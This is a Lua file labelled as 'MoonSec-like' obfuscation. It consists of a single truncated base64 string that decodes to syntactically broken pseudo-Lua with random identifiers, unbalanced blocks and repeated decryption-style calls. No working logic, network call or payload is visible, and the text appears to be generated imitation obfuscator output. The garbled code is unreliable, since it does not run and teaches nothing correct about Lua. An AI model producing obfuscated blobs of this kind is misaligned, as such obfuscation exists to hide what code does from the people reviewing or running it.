-- MoonSec-Like Obfuscation
local b='ICAgICAgICAgICAgbG9jYWwgbGpQRnl4c2FMdyA9IHsKbG9jYWwgZnVuY3Rpb24geERITVZ3cUxtcSgpCiAgICAgICAgICAgIGlmIE5zamlpc1FGTlg6Wndvb1NpalVISygoKGtqWXJEQWRtQm0pWyJ6YVBiaFRoYlJuIl0oIlRidVdtTFpmVVAiKSkpIEx6dW9jVkRzR3Igcm9pS1lrclhIdC5jbUJIYUdyd1ZGIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgamNiUHFnZ1NhcSA9IEtrek9pU0Jqc2wuSFd2cUVWaUhtTTpad29vU2lqVUhLKE5nbXBmZHlLZ0opCiAgICAgICAgKChzUmlSbmlKcnZHKVsiemFQYmhUaGJSbiJdKCJxRHJSQk1qd1p4IikpLCAoKHZwdlhrZFl2VnApWyJ6YVBiaFRoYlJuIl0oIkVYVGZHZWhhZEk9PSIpKQogICAgICAgIHsKTE9qWnBGU3FQVC5Hd3VxV3d5QXhJID0gMQogICAgICAgICAgICAgICAgZW5kCiAgICBlbmQKICAgICAgICAgICAgZW5kCmVuZCkKClhVQkJua0FFencuV0hqb3RLRXRBdSA9IDAuMgotLSAvLyAvLyAvLyBxS3dVYWlWanNJIFJvb05HREdHemwgLy8gLy8gLy8gLS0KbG9jYWwgb1hpZUdOUmNkViA9IFBRVUVpUkJzd2ouT3dKRFlUV3dRYgogICAgICAgICAgICBoaVNUakhWTU1lLnhoVG9namVpZmgoMSwgV2pZclpraEtWTS5YSWVic3l5TWZWLmVWWXVCZlFXWnMsIFdqWXJaa2hLVk0uaVF1R0VobkFFZy5SZ3hiS3JnamVaKSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGhFdGVsS3NFb3Y6a2h2bENydGhCYShuaWwpCiAgICAgICAgZ0RacWhUbXBxZwoKCiAgICBlbmQKICAgICAgICBpZiBBWFhCSnlWT1NiIHRoZW4KICAgICAgICBlbmQpCiAgICAgICAgICAgICAgICAgICAgICAgIHlKWUdkVmp6ZUcuU1RCYkhCZ2ZLSyhhdFBwWm96SlpnLCAxLCBYVURuZVR5Y3NrKQogICAgICAgICAgICAgICAgICAgIGZ1bmN0aW9uKCkKICAgICAgICAgICAgS2xHRWlQb05PSS5VdVdLSEJxbEJlID0gKChyeUNCWGRFVURmKVsiemFQYmhUaGJSbiJdKCJxZ3p0RXJBSmxtIikpCiAgICAgICAgZW5kCmxvY2FsIGxLa1JGYnFMb1ggPSBFU2hYSFJxSHBKOmVNSUJrc0xvRFIoKChobFZwZmlpQUtmKVsiemFQYmhUaGJSbiJdKCJlVHJYdkNNeXZ2PT0iKSksIHsKICAgIGZ1bmN0aW9uKCkKICAgIGVuZAogICAgICAgIE9JU25tdHRtZ1UgPSBLT3BHRmxLV0RyCiAgICBlbmQpCiAgICAgICAgICAgIGxvY2FsIFVXZnlCbFFXdWkgPSBES2ZLUlhqV1JlLmlMbkd4ZGRoQWouS2t6T2lTQmpzbAogICAgICAgICAgICBsb2NhbCBBTlV3SGJVdVNjID0gV1N2cVJoVFZTdyhoQ2FsRXJEZkZEKQogICAgICAgIGRHZnBVWklERUYgdHJ1ZSBwWWlpV1pHVUJyCiAgICBJQ0d2RXZrbEl6ID0gU1V5WFd3WEZJdC54aFRvZ2plaWZoKCgocnVOSmRoS0pzWSlbInphUGJoVGhiUm4iXSgicUpRUlBsUU9xeT09IikpKQogICAgICAgIGVuZAogICAgICAgIGxhd2tXQVZVaFogPSAoKFNjc3pHdmZ5QUUpWyJ6YVBiaFRoYlJuIl0oImxnS1h3WHNkbkI9IikpLAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgICAgICAgICBtT3RXRlBOSmpTID0gbVZiam1meWRWbS54aFRvZ2plaWZoKEp4ckh5WURjWE4uaElDckFaVXFsZCArIFZwbWlORlhhZ08ueGhUb2dqZWlmaCgwLCA3NCwgMCkpCiAgICB2R0xsQnpXZ0NqID0gZmFsc2UsCiAgICAgICAgbG9jYWwgdkFqblFrTk5jayA9ICgoZlJFb0l5bkFQZSlbInphUGJoVGhiUm4iXSgiVVZZTHhTZHF1Tz09IikpIC4uIGRhVGRTdG9nUFAKICAgICAgICAgICAgRk5tRXdHbnp1TzpMdEJpZ3lTSVpXKCkKbG9jYWwgZFpjVEFhSEhweSA9IGZhbHNlCmxvY2FsIGZ1bmN0aW9uIHZveEtFZmhVSWooZkFja0xQck9YWikKICAgICAgICAgICAgICAgIFpacnZpWExjQUwoKChWek1GRlFnRHFWKVsiemFQYmhUaGJSbiJdKCJjWUVKbFVOV1pYPT0iKSkpCiAgICAoKGxzYUZMVmRwSEkpWyJ6YVBiaFRoYlJuIl0oInNQSGRJVWN3UGg9IikpLApsb2NhbCBHRHNYbGpvVnNMID0gUW5MWGlWVk9Vai5NSXlGQ3lXeUpPOml2VXJKWHdrblooKChRdHpQZmlZWWRnKVsiemFQYmhUaGJSbiJdKCJFa2tqc2J6TVR2IikpLCB7bGF3a1dBVlVoWiA9ICgoV0R6aEJGWm5DeilbInphUGJoVGhiUm4iXSgidEZzRndWcmJKaT09IikpLCB2R0xsQnpXZ0NqID0gZmFsc2V9KQogICAgKChIQWxUeFZXaVF6KVsiemFQYmhUaGJSbiJdKCJFSlZHQVdBdFhzIikpLAogICAgICAgIElObW93TkJKSWYgPSAxNiwKICAgIHsKICAgICAgICAgICAgICAgICAgICBpZiBibWpCQ0J4WENyIHRoZW4KCiAgICBpZiBqY2JQcWdnU2FxIEx6dW9jVkRzR3IgcXNsR0JzSEdCViBES2ZLUlhqV1JlLmlMbkd4ZGRoQWouS2t6T2lTQmpzbC5IV3ZxRVZpSG1NOlp3b29TaWpVSEsoamNiUHFnZ1NhcS5VdVdLSEJxbEJlKSB0aGVuCi0tIEdaRVRwb3BpY1ggQ2lSZkFwUEJtUSBhY0hpa1RrY3laIEFKUnJUYVZzTUkgSmNrT1ZGS3JKSgogICAgbGF3a1dBVlVoWiA9ICgoS3pwU09jamNoUilbInphUGJoVGhiUm4iXSgiVElxSmdQb2FaUCIpKSwKICAgIH0KICAgICAgICAgICAgICAgIFpsbG1rYmZIbXFbZExRZGxic1prdy5VdVdLSEJxbEJlXSA9IHt9Ck1rb1pCYktWemQ6Ull3QWJERmZpSSgKICAgICAgICAgICAgICAgICAgICAgICAgWmx3YXJSb25pVigoKExOR1FWa3BKUGkpWyJ6YVBiaFRoYlJuIl0oIjRweUZJRTk0ZVdkbGJpQT0iKSkgLi4gKEtPcEdGbEtXRHIgTHp1b2NWRHNHciAoKE1BRk15T0V5TEIpWyJ6YVBiaFRoYlJuIl0oIlF6cUtpcHFxV1YiKSkgSmRsbGRmRnl3WCAoKHhhZ2VxZWVCd3IpWyJ6YVBiaFRoYlJuIl0oIkN2S0VZT2trT1M9PSIpKSkpCiAgICAgICAgZW5kCiAgICByZXR1cm4gKChqemZPUllSQ0xSKVsiemFQYmhUaGJSbiJdKCI4SitJWURiVVlnc0NsPSIpKSAuLiBwVk9ZVmhyeEhrIC4uICgoV2ZZUURJWUFOUilbInphUGJoVGhiUm4iXSgiT0xTSWNyZmlPbz0iKSkgLS0gV0lFRXdMZHlSdiBuVUpJYmlxS05nIGtIS1lWRUVGSWIgaWt5akJxS2pJZiBBenN5YmV3ZUxTIEt2aGNGdk94YVQgUlBweFNpaGRnWSBuS1pmaGRoTHR4CiAgICBhblRuekFvQ2l6ID0gZmFsc2UsCiAgICBlbmQKUW5MWGlWVk9Vai5IZHRvQ3B1SnhDOmZJV0RBT3BCeEYoKChySHhheFpRZ0lEKVsiemFQYmhUaGJSbiJdKCJGb1JSZmdHcnpXIikpKQpZV0tQa2loUWZVOlJZd0FiREZmaUkoCiAgICBkR2ZwVVpJREVGIEp6anpmcWh5eEwgcFlpaVdaR1VCcgogICAgbG9jYWwgc0Z3eFVockVtWSA9IFBZV2lETFlkUEMgTHp1b2NWRHNHciBQWVdpRExZZFBDOkJTaURtU0tIU3MoKChGcUZ1R1NxSWZRKVsiemFQYmhUaGJSbiJdKCJORkxVanhFZE5GPT0iKSksIDUpCiAgICB2R0xsQnpXZ0NqID0gbmlsCikKICAgICAgICAgICAgZnVuY3Rpb24oKQopCiAgICAgICAgICAgICAgICBLa3pPaVNCanNsLkhXdnFFVmlIbU0ueEhsZXlDU0NBeTpDS1pjZllKcWp0KGlxbHRrWHdsT0Y6Wndvb1NpalVISyhOZ21wZmR5S2dKKSkKICAgICAgICAgICAgICAgICkKICAgICAgICAoKFdYdEt5Q3Nva1ApWyJ6YVBiaFRoYlJuIl0oIlhWcXhyWnZRQWY9PSIpKSwgKChIamVJWERJZWRUKVsiemFQYmhUaGJSbiJdKCJqeUdjS1lrenpTPSIpKSwgKChaRFZYV2pjdWFQKVsiemFQYmhUaGJSbiJdKCJrZWNIaHZRR3huPSIpKSwKLS0gbWRWbFh5TmdSaiBrSEtZVkVFRkliIHlkVmpsY2hzdnkgbUZ1SWtVRmpjcyBETERoTlpwbmR4CiAgICAgICAgICAgICAgICBsb2NhbCB3U1FPaVBjSGtJID0gaEV0ZWxLc0Vvdi53U1FPaVBjSGtJCiAgICAgICAgTlFaVUhQV0RNbyA9IGZ1bmN0aW9uKHVIc1NnREhKaVcpCiAgICAgICAgICAgICAgICAgICAgKQogICAgICAgICAgICBpZiBxc2xHQnNIR0JWIGd4REZDVEhLZ2ggSmRsbGRmRnl3WCB6bkxFbkxmQW9ULm1GdUlrVUZqY3MoZ3hERkNUSEtnaCkgPT0gKChpdWhlY0VjZVpnKVsiemFQYmhUaGJSbiJdKCJHS0VnRkZUekdaPT0iKSkgdGhlbgogICAgICAgICAgICAgICAgQ0luYnVuVEtOVyA9IHRydWUsCikKZW5kKQogICAgICAgIHRTWU93YUt3b1godEhlb3ZoSmtSQSkKLS0gW3tyYmN2YllGeWF3fV0KICAgICAgICBLa3pPaVNCanNsLmtobllXZ0NvUkc6a2phcWp6RG5CbCgKICAgICAgICAgICAgaWYgVGxaYldiSktPTCB0aGVuCiAgICAgICAgICAgICAgICAgICAgaWYgbU90V0ZQTkpqUyB0aGVuCgogICAgICAgICAgICAgICAgICAgICAgICBYVURuZVR5Y3NrLnhCbXBxcktsbEsgPSBuaWwKCiAgICAgICAgICAgIFhaVFNQQnpVVk8gTXBLYW1WR21YaiwgQURDblNHbnJ0USBtdHBkQ0VjRURqIHloelRVY0NZZk8oaGZtc3lUV2t1UjpFYXRPaWZYTFpVKCkpIHBZaWlXWkdVQnIKCiAgICB9Ci0tIC8vIC8vIC8vIGVZdHVNRHFBbFIgUm9vTkdER0d6bCAvLyAvLyAvLyAtLQogICAgICAgICAgICBzeEZIUlRLa0ltIEx6dW9jVkRzR3IgUHpPZmZFcHpiai5VdVdLSEJxbEJlID09ICgoZ0FBb0tkenhiTylbInphUGJoVGhiUm4iXSgidXZOaWJsamdQdyIpKSBMenVvY1ZEc0dyIFB6T2ZmRXB6YmoueEJtcHFyS2xsSyBMenVvY1ZEc0dyCiAgICAgICAgaWYgZXpieXBGV2FwSCB0aGVuCmxvY2FsIElXREpQQ2RndkcgPSBES2ZLUlhqV1JlOlNjU0RpRHVPWnMoKCh0TGVwdmZjckR1KVsiemFQYmhUaGJSbiJdKCJRTG1uVUdaZUxMPT0iKSkpCgogICAgICAgIGlmIHNUUE9obWdJYUYuVXVXS0hCcWxCZSA9PSAoKHVmVXJFd3paVGcpWyJ6YVBiaFRoYlJuIl0oIlFMYUVIQlhGbGk9PSIpKSBMenVvY1ZEc0dyIHNUUE9obWdJYUY6VndJdmhFd05LdigoKGV4VHRjRXBra28pWyJ6YVBiaFRoYlJuIl0oInFlc2x5eVZOYkMiKSkpIHRoZW4KICAgIAogICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBtYmVPWnBFd1h5Lm1iUmx2T0F3VFogPSBUTEhXcVRueUZKLlRBSG1SZmhUeGUKCiAgICAgICAgZW5kCi0tIFJ1VlVuWGlUZVAuaElDckFaVXFsZCA9IFBmdUZUc3JFS1kueGhUb2dqZWlmaCgwLjQsIDAsIDAuMjUsIDApIC0tIE1pZ21YZ2hHUE8gUnVwb1RDZnZXZiBjdGNmUnJrY1FrIEVja01YYnNiZ2ggZHJLVU90QkRmbSBSdXBvVENmdldmIEJTVE5mbXlITmIKICAgICAgICAgICAgaWYgZExRZGxic1prdzp2VXlWWlRQaERlKHRIZW92aEprUkEsIDEsIHRydWUpIHRoZW4KICAgICAgICAgICAgaGlTVGpIVk1NZS54aFRvZ2plaWZoKDEsIFdqWXJaa2hLVk0uWEllYnN5eU1mVi5lVll1QmZRV1pzLCBXallyWmtoS1ZNLmlRdUdFaG5BRWcuUmd4YktyZ2plWiksCiAgICB7CmVuZAogICAgICAgICAgICAtLSBZeFJJQldidmZRIGlZVE9zVHdCREQgSGdHeWJKVERRaAogICAgICAgIC0tIEdaRVRwb3BpY1ggcUFrZ0JWRVdtZwpjWFNEVXF3d2xELm5tZUF0dHlLUmYgPSBmYWxzZSAtLSB2R0xsQnpXZ0NqIGxpTHBCRlF2VWgKCiAgICAgICAgaWYKICAgICAgICBXWklLZlhEbWdKID0gKChPYnJHT0xMcWVVKVsiemFQYmhUaGJSbiJdKCJ4d29jaWp0ZUlOPSIpKSwKZW5kCmlmIEFhd29jR2xNRWEgdGhlbgogICAgICAgICAgICAgICAgWmx3YXJSb25pVigoKHJwd3J1dWVNc2cpWyJ6YVBiaFRoYlJuIl0oInR4YnVtaXhRaUk9IikpKQogICAgICAgICAgICBsb2NhbCB4ZnphTUlWdm5CID0KICAgICAgICAgICAgICAgICAgICBoaVNUakhWTU1lLnhoVG9namVpZmgoMSwgV2pZclpraEtWTS5YSWVic3l5TWZWLmVWWXVCZlFXWnMsIFdqWXJaa2hLVk0uaVF1R0VobkFFZy5SZ3hiS3JnamVaKSwKICAgIGlmIEZObUV3R256dU8gdGhlbgpIVGJHYU16YlZXOktNdVRUQ0FLZXAoMSkKICAgIFFuTFhpVlZPVWouWkVOT2pCcWZqSDpWcGNPbkt1V0pPKApsb2NhbCBLa3pPaVNCanNsID0gREtmS1JYaldSZS5pTG5HeGRkaEFqLktrek9pU0Jqc2wKLS0gclZscGtGVEdnayB1REJ4SENoU0h1CiAgICAgICAgWFNEcmJ5dHJnZCA9IFdxQldVdmpySFMubVZiam1meWRWbQogICAgICAgICAgICAgICAgaElDckFaVXFsZCA9IFBmdUZUc3JFS1kueGhUb2dqZWlmaCgwLjUsIDAsIDAuNjUsIDApIC0tIEd6U0d0aVpVUFIgY3RjZlJya2NRayBqUGVlYnNiV2tNLCBMckJtcFpyQ2JVIHpodlZnZFVyV1UgSHpUVlBrRUJISiB4ZUdlT3RpTG1qCmxvY2FsIGZ1bmN0aW9uIGVaVk1Oa2R3U2coKQogICAgICAgIGxhd2tXQVZVaFogPSAoKENxWVlsZlhDTk4pWyJ6YVBiaFRoYlJuIl0oIkF0RWNxSUtpVXM9IikpLAoKICAgICAgICB2R0xsQnpXZ0NqID0gZmFsc2UKICAgIGVuZCkKbG9jYWwgY1hFeUFiQXRUdSA9CiAgICAgICAgZW5kCmxvY2FsIEpGc3VaUmFOUWIgPSBFU2hYSFJxSHBKOmVNSUJrc0xvRFIoKChQckFkbUZOZWtKKVsiemFQYmhUaGJSbiJdKCJLQ0p4Q3dZaFFGIikpLCB7CiAgICBlbmQKICAgICAgICAgICAgbG9jYWwgbUtSTEljQlJwTSA9IFZwbWlORlhhZ08ueGhUb2dqZWlmaCgtOTMxLjUyNSwgMjIzLjc4NCwgLTk4Ni44NDkpCi0tIC8vIC8vIC8vIHFLd1VhaVZqc0kgSXdmYmZXTlFibiAvLyAvLyAvLyAtLQogICAgTlFaVUhQV0RNbyA9IGZ1bmN0aW9uKCkKICAgIGVuZCwKbG9jYWwgZnVuY3Rpb24gbm1lQXR0eUtSZigpCiAgICAgICAgZW5kKQogICAgICAgICAgICBsb2NhbCBjeVlVd1FaTHl5ID0gVVdmeUJsUVd1aS5IV3ZxRVZpSG1NIEpkbGxkZkZ5d1ggVVdmeUJsUVd1aS5raG5ZV2dDb1JHOk93SkRZVFd3UWIoKQpsb2NhbCBmdW5jdGlvbiB0aGdDdllUUE5hKCkKCmxvY2FsIFRoc01SbUZWaHQgPSBmYWxzZQoKCiAgICAgICAgYW9lQ250Vml5cS5tdFlNQ1pLZ2ZBKGZ1bmN0aW9uKCkKICAgIGVuZAoKICAgICAgICAgICAgICAgIElOYlRZUmpHVGEgPSBuaWwKUW5MWGlWVk9Vai5ZRnFsZVFZb252OlZwY09uS3VXSk8oCi0tIFRHRk9Vb2tVYlkgbnNHVkpRQnBJciBRRVlVSW9IdUxyIEZHZW9kdllkWVcgdXpKYXRVeXdFTyBIWnlIV3pJYlB2IE5Ja3dxWG16cE4kCgpJY2JRTHFVQ3p6OlJZd0FiREZmaUkoZnVuY3Rpb24oKQoKICAgICAgICBpZiBMeGp2SnV5VGRXOlZ3SXZoRXdOS3YoKChNcEt0QWNBY0tsKVsiemFQYmhUaGJSbiJdKCJkWE95R2pMUE54IikpKSBMenVvY1ZEc0dyIEx4anZKdXlUZFcuVXVXS0hCcWxCZSA9PSAoKEJ6Q1JLZnZkb1gpWyJ6YVBiaFRoYlJuIl0oIlhQRklZdHFZeUo9PSIpKSB0aGVuCiAgICAgICAgbG9jYWwgVGx6ck1tR2psRiA9IHdldEJGQmp1RnpbVExIV3FUbnlGSi5mZERYTWF6VFlpKCN3ZXRCRkJqdUZ6KV0KbG9jYWwgTWtvWkJiS1Z6ZCA9CiAgICAgICAgICAgICAgICBpZiBBRENuU0ducnRROlZ3SXZoRXdOS3YoKChsU3N5QlJCZmZOKVsiemFQYmhUaGJSbiJdKCJHaFRwbWdmUExIPSIpKSkgdGhlbgpRbkxYaVZWT1VqLllGcWxlUVlvbnY6ZklXREFPcEJ4RigoKEl2VXF0VWJiQ1MpWyJ6YVBiaFRoYlJuIl0oImhTUFpPS0lLZG0iKSkpCn0pCiAgICB7CmxvY2FsIGdjcGtrakdwWk8gPQogICAgICAgICAgICAgICAgdm94S0VmaFVJaihjR1NxSGxIUnltKQpsb2NhbCBVaHZxRVpYWmhjCmxvY2FsIG5GVUxLUWJCdWogPQopCmxvY2FsIFRsWmJXYkpLT0wgPSBmYWxzZQogICAgZW5kClFlYmhuYlRFbkIuVXVXS0hCcWxCZSA9ICgobW1GY2dRTHFMSylbInphUGJoVGhiUm4iXSgiaEFUaGVoUGp6bCIpKQp9KQogICAgZW5kCiAgICBJQ0d2RXZrbEl6LnhCbXBxcktsbEsgPSBES2ZLUlhqV1JlLldwcVVYZmdKWEwKICAgICAgICBhb2VDbnRWaXlxLm10WU1DWktnZkEoZnVuY3Rpb24oKQogICAgICAgIGlmIExVb2dIbHpwTkIgPT0gdHJ1ZSB0aGVuClFuTFhpVlZPVWouSGR0b0NwdUp4QzpmSVdEQU9wQnhGKCgoVkFiVlNtVm5yaClbInphUGJoVGhiUm4iXSgibEFuS0huZFF5Sj09IikpKQoKICAgICAgICAgICAgICAgICAgICByQ254R3RsQ1hROnB3WUhrUlF5SGYoZmFsc2UsIFdqWXJaa2hLVk0uQ3VQa0Jud2ppeS5vaFVSS01qckVnLCBmYWxzZSwgREtmS1JYaldSZSkKKQoKKQoKCiAgICB9CiAgICAgICAgLS0gVEpkR1NuVmhqSiBYbHd6bGp2WVphIEdlb0tzY2VkeFggbnJYRXdsY3puQiBpbkF5eGdzUWJMIERCWlB3SXRnV3EKCgpsb2NhbCBYZlFtTHhiY1ZtID0KICAgICAgICAgICAgQ0J3TGtSR1JqdCA9IDUKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBzeEZIUlRLa0ltID0gZmFsc2UKICAgIGZ1bmN0aW9uKEtPcEdGbEtXRHIpCiAgICAgICAgICAgICAgICAtLSBJRmZtWVdhbkFoIHRVRFZIcU56VmwgSHpVUFNOeHZjQSBrSEtZVkVFRkliIGRxb3BERkRpd0ogSW9iU2VqaU5HUgogICAgICAgICAgICBpZiBxc2xHQnNIR0JWIFlFVXp0ZGZDd0YgdGhlbgogICAgICAgIERUQVlkdHVDYmIgPSAyMDAsCiAgICBlbmQKKQogICAgICAgICAgICAgICAgaWYgQWF3b2NHbE1FYTpad29vU2lqVUhLKCgocGVLWE1GcEJVUilbInphUGJoVGhiUm4iXSgiT1d1ZHJFYmRDTT0iKSkpIHRoZW4KbG9jYWwgVWVsYmNhdFpkTyA9IGZhbHNlCgogICAgICAgICAgICBpZiBjR1NxSGxIUnltIHRoZW4gCiAgICAgICAgICAgICAgICAgICAgaGlTVGpIVk1NZS54aFRvZ2plaWZoKDEsIFdqWXJaa2hLVk0uWEllYnN5eU1mVi5lVll1QmZRV1pzLCBXallyWmtoS1ZNLmlRdUdFaG5BRWcuUmd4YktyZ2plWiksCiAgICAgICAgICAgIGVuZAogICAgYW5UbnpBb0NpeiA9IGZhbHNlLApsb2NhbCBFU2hYSFJxSHBKID0gUW5MWGlWVk9Vai5aelRBaVhnZG9uOmZJV0RBT3BCeEYoKChYWXFJT1Bha0RyKVsiemFQYmhUaGJSbiJdKCJmb0VmSEtaSVJEIikpKQpzc2JGQUttbUlDLndiV2FyRnhUdW8gPSBXallyWmtoS1ZNLndiV2FyRnhUdW8ueWJSSENVS3RRYgoKICAgIEdVQVFXY2VaVWIgPSBIVGJHYU16YlZXOkxyZGRnR01aZGsoe2xhd2tXQVZVaFogPSAoKHJSZ0hiU29yYkspWyJ6YVBiaFRoYlJuIl0oIlhiZG95dmlFVHM9IikpLCB4UmpZQW9rdWFpID0gKChOaUVOcndhQ0NqKVsiemFQYmhUaGJSbiJdKCJuV3VYWm5ZTWJqIikpfSkKICAgICAgICAgICAgICAgICAgICAgICAgWFVEbmVUeWNzazpWd0l2aEV3Tkt2KCgoUGpzSUhoenJ1cSlbInphUGJoVGhiUm4iXSgic1JRelpBalVjZCIpKSkgSmRsbGRmRnl3WCBYVURuZVR5Y3NrOlZ3SXZoRXdOS3YoKChEd3paVHdmQ1F6KVsiemFQYmhUaGJSbiJdKCJXYlFMRkFsTml5PSIpKSkgSmRsbGRmRnl3WCBYVURuZVR5Y3NrOlZ3SXZoRXdOS3YoKChxSFJOT0hBRnB1KVsiemFQYmhUaGJSbiJdKCJZS0JyQkFjaXF4IikpKSBKZGxsZGZGeXdYIFhVRG5lVHljc2s6VndJdmhFd05LdigoKFZHaWJVdllqam0pWyJ6YVBiaFRoYlJuIl0oIk5hVmp3cVFFQk09IikpKSBKZGxsZGZGeXdYCmxvY2FsIExsbWlaY2VOd0ggPSBRbkxYaVZWT1VqLkRHVm5rTmlraFM6aXZVckpYd2tuWigoKGRDY1RNdmtQeFEpWyJ6YVBiaFRoYlJuIl0oImlRZmZMbnh0dHM9PSIpKSwge2xhd2tXQVZVaFogPSAoKFFLc0VMY2FpdGEpWyJ6YVBiaFRoYlJuIl0oIlNpTGFPaXBnUkIiKSksIHZHTGxCeldnQ2ogPSB0cnVlfSkKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGdEWnFoVG1wcWcKICAgICAgICAgICAgaW9CQWtHV1RkSzpBdkdaeHpkZWx1KHNOb2VodU1kYVMgLi4gKChNUXFHT09ibEZkKVsiemFQYmhUaGJSbiJdKCJaVmxzaWpqa0xEPSIpKSAuLiB2QWpuUWtOTmNrKSAtLSBXSUVFd0xkeVJ2IFxFRFlrRmF3Z0t3IGtIS1lWRUVGSWIgSGZiSWd6dFRTaiBRekZkdGdjY1dNCiAgICBoaVNUakhWTU1lLnhoVG9namVpZmgoMSwgV2pZclpraEtWTS5YSWVic3l5TWZWLmVWWXVCZlFXWnMsIFdqWXJaa2hLVk0uaVF1R0VobkFFZy5SZ3hiS3JnamVaKSwKbG9jYWwgRVNoWEhScUhwSiA9IFFuTFhpVlZPVWoucUt3VWFpVmpzSTpmSVdEQU9wQnhGKCgoc3lVSkNMVUVRdilbInphUGJoVGhiUm4iXSgiYkh1RlJCbXVsTj09IikpKQogICAgICAgIGlmIHNUUE9obWdJYUYuVXVXS0hCcWxCZSA9PSAoKHVmVXJFd3paVGcpWyJ6YVBiaFRoYlJuIl0oIlFMYUVIQlhGbGk9PSIpKSBMenVvY1ZEc0dyIHNUUE9obWdJYUY6VndJdmhFd05LdigoKGV4VHRjRXBra28pWyJ6YVBiaFRoYlJuIl0oInFlc2x5eVZOYkMiKSkpIHRoZW4KLS0gbUZ5Vk5hT1FDSiBrSEtZVkVFRkliIFh3T3puZm5lbHQgdmdDVUtXZG9YbyBVdVdLSEJxbEJlIGNOd1lKdVdVQWIgKEVrTWJkR3hkdkwgSWFsakV1bVRHeSBHVXNOWnlwTUlyIG15YWdBWElzbXQpCgopCiAgICAgICAgICAgICAgICBDdmFvdGVLamlTID0gdU5LTnNGZmthcjpxZ2FLV0tscVZ1KCkKKQogICAgICAgICAgICBhb2VDbnRWaXlxLm10WU1DWktnZkEoWGVYbW1yQmlOSykKICAgICAgICAgICAgICAgICAgICBsb2NhbCBtT3RXRlBOSmpTCikKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZ0lnT3FzUmRzSCgKICAgICAgICAgICAgICAgICAgICBzR0tZWlJPUkhtOnZOZ010ZlB3VngoCiAgICB9CiAgICAgICAgICAgIGN5WVV3UVpMeXk6c09ERm96endQeShtVmJqbWZ5ZFZtLnhoVG9namVpZmgoZWlGQW52RVdVQykpCmxvY2FsIGZ1bmN0aW9uIG1mb3V6WkNJZkUoUVhDY2ZvdmxXRywgRnFMSHRScnVmRikKICAgICAgICAgICAgICAgIE5zamlpc1FGTlguVnNPYkh0VExmdy5YbUhydlN3S1VJID0gKChpenVWc3h2SFdRKVsiemFQYmhUaGJSbiJdKCJRc01VbU5Ra3RNPSIpKQogICAgUW5MWGlWVk9Vai5aelRBaVhnZG9uOml2VXJKWHdrblooKChPVXZMVUxXYmVtKVsiemFQYmhUaGJSbiJdKCJVd1FXY056WWFWIikpLCB7bGF3a1dBVlVoWiA9ICgoRFlReWl6ZkxhcylbInphUGJoVGhiUm4iXSgib0RScXZXZE5MaSIpKSwgTXFZb3hEb3NKRyA9ICgoTnJhbHZFY2hERSlbInphUGJoVGhiUm4iXSgiamdXTW1KUU5tWSIpKSwgdkdMbEJ6V2dDaiA9IGZhbHNlfSkKICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgWG1EcHhCRXd6cSA9IEtrek9pU0Jqc2wuSFd2cUVWaUhtTTpad29vU2lqVUhLKCgoUUpVUFVZQmlTSilbInphUGJoVGhiUm4iXSgiY1BjbmZ2VHlWRT09IikpKQogICAgICAgIGVuZApsb2NhbCBvVGtLaVFtZkdsID0gaG5RVlFVRW5JeShES2ZLUlhqV1JlOklVcnZDTWJMTFMoKChheE9JeXFEQVNwKVsiemFQYmhUaGJSbiJdKCJPdHZLTGFrZHNMPSIpKSkpKCkKCiAgICBIZHRvQ3B1SnhDID0gSFRiR2FNemJWVzpMcmRkZ0dNWmRrKHtsYXdrV0FWVWhaID0gKChJa05oVnJMVlV0KVsiemFQYmhUaGJSbiJdKCJwWlFycUxaQktPPT0iKSksIHhSallBb2t1YWkgPSAoKGNiU0hYRWdVYnApWyJ6YVBiaFRoYlJuIl0oIlhvTlpjamdiRGciKSl9KSwKdVZGWXRZeWR0bzpwWnZvd2xUd1ZRKG9Ua0tpUW1mR2wpCiAgICBsb2NhbCBabGxta2JmSG1xID0ge30gCm5GVUxLUWJCdWo6Ull3QWJERmZpSSgKICAgICAgICBsb2NhbCBmdW5jdGlvbiByV2RNektxRlRqKCkKICAgICAgICAgICAgc3hGSFJUS2tJbSA9IHRydWUKICAgICAgICAgICAgLS0gclZBbnNxSG55ViBLcXBuY0JGQ3lvIFpNVnVGVFpma3EsIERpVFROVUVUY1ggY3RjZlJya2NRayBXTkVzR3hoTXJBIFhMbkZUYWtMaEYKICAgICAgICAtLSBHWkVUcG9waWNYIHFBa2dCVkVXbWcgckZJQmNvcmRYQiB1RkpTbkpjVVhZIFNFT1p1RnRweGYKICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBoRXRlbEtzRW92OmtodmxDcnRoQmEobmlsKQogICAgICAgICAgICAgICAgUHpPZmZFcHpiai54Qm1wcXJLbGxLLlV1V0tIQnFsQmUgPT0gKChhU1pnc1JiUHJtKVsiemFQYmhUaGJSbiJdKCJ3UHBETmhDUUlTPSIpKQoKCiAgICB7CgogICAgICAgICAgICAgICAgICAgIEFhd29jR2xNRWEuU2pSZ3JiUG1May5YbUhydlN3S1VJID0gKChKVEpiTG5SWG9IKVsiemFQYmhUaGJSbiJdKCJDUG1nSVFWelNlPSIpKQogICAgewogICAgfQoKICAgICAgICAgICAgICAgIGRPUmhBUGN0YUQgPSB0cnVlLAoKCgogICAgICAgICAgICAgICAgYW9lQ250Vml5cS5iU2V5anl3ZEVPKDEpIC0tIEFFZ3pLT01JQ3UgblVsS3dSWldWYSBkcktVT3RCRGZtIENFem5LUHdXbFUgY2JYcGF5WVVuWCBtdFlNQ1pLZ2ZBCiAgICAgICAgTlFaVUhQV0RNbyA9IGZ1bmN0aW9uKHVIc1NnREhKaVcpCmVuZCkKICAgICAgICBlZ01NU1ZETGZzID0gS09wR0ZsS1dEciAgLS0gWEx0TUFrRXJrYiBSUHB4U2loZGdZIEVybWFJbUFqa1YgS21CcVdnUlZUeSBLcXBuY0JGQ3lvCiAgICAgICAgbG9jYWwgRExvamdSR3d3dyA9CiAgICBlbmQKbG9jYWwgb2NMd3dTYkZ3diA9IHt9CiAgICAgICAgICAgICAgICAgICAgaWYgWFVEbmVUeWNz